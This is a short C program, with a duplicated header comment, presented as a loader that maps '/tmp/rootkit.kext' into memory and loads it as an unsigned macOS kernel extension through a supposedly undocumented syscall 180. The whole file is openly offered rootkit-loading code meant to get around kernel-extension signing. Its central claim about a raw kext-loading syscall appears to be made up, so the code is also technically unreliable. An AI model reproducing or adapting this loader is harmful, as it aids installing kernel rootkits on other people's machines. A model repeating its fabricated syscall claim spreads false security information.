// Load unsigned KEXT from memory (macOS <= 10.9)

// Load unsigned KEXT from memory (macOS <= 10.9)
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <mach/mach.h>

#define KEXT_PATH "/tmp/rootkit.kext"
#define SYS_kextload 180  // Syscall ID for macOS <= 10.9 (undocumented)

int load_kext_from_memory(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return -1;
    }

    struct stat st;
    if (fstat(fd, &st) < 0) {
        perror("fstat");
        close(fd);
        return -1;
    }

    void *kext_data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (kext_data == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return -1;
    }

    printf("[*] Loading KEXT from memory...\n");
    // On macOS 10.9 and below, syscall 180 allowed raw kext loading
    long result = syscall(SYS_kextload, kext_data, st.st_size);
    if (result != 0) {
        perror("syscall SYS_kextload");
        munmap(kext_data, st.st_size);
        close(fd);
        return -1;
    }

    printf("[+] KEXT loaded successfully.\n");
    munmap(kext_data, st.st_size);
    close(fd);
    return 0;
}

int main() {
    return load_kext_from_memory(KEXT_PATH);
}